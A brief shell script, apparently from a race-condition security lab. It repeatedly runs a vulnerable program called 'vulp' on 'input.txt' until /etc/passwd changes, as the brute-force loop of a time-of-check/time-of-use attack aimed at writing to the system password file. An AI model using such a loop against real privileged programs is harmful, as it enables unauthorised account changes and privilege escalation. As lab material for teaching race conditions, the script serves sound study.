#!/bin/sh

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" = "$new" ]
do
	./vulp < input.txt
	new=$($CHECK_FILE)
done

echo "Stop! The passwd file has been changed!"
